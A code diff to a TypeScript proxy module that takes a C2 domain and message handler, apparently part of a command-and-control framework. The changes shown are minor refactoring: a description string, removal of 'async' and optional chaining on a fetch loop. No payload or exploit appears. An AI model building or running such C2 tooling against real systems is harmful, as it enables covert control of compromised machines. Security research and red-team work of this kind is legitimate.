@@ -4,6 +4,8 @@ import { Constants, emsg } from "../utils/utils";
 import BaseModule from "./base";
 import Logger from "../lib/logger";
 
+const MODULE_DESCRIPTION = "manage the proxy configuration";
+
 export default class ProxyModule extends BaseModule {
     fetchTimer: NodeJS.Timeout | null;
     log: Logger;
@@ -12,6 +14,8 @@ export default class ProxyModule extends BaseModule {
     constructor(protected configFile: string, protected c2Domain: string, protected c2MessageHandler: Function) {
         super("proxy", configFile);
         this.log = new Logger();
+
+        this.description = MODULE_DESCRIPTION;
 
         this.fetchTimer = null;
         this.payload = "";
@@ -104,7 +108,7 @@ export default class ProxyModule extends BaseModule {
         return;
     }
 
-    async getFromProxy() {
+    getFromProxy() {
         if (!this.config.enabled) {
             this.log.error(`proxy is not enabled: try 'set enabled 1'`);
             return;
@@ -182,7 +186,7 @@ export default class ProxyModule extends BaseModule {
         if (this.fetchTimer) clearTimeout(this.fetchTimer);
         if (!this.config.enabled) return;
 
-        this.getFromProxy().finally(() => {
+        this.getFromProxy()?.finally(() => {
             this.fetchTimer = setTimeout(() => {
                 this.proxyFetchLoop();
             }, this.config.interval);
